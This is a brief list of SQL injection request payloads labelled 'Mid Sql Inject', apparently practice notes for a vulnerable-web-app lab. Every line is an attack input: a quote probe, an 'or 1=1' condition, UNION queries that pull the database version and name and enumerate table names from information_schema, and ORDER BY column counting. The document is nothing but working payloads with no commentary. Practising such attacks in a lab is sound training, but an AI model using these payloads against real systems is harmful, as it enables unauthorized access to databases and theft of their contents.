-- Mid Sql Inject 

id=3&Submit=Submit

id=3'&Submit=Submit

id=3 or 1=1&Submit=Submit

id=3 UNION select version(), database()&Submit=Submit

id=3 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = database() -- -

id=3 ORDER BY 2-- -&Submit=Submit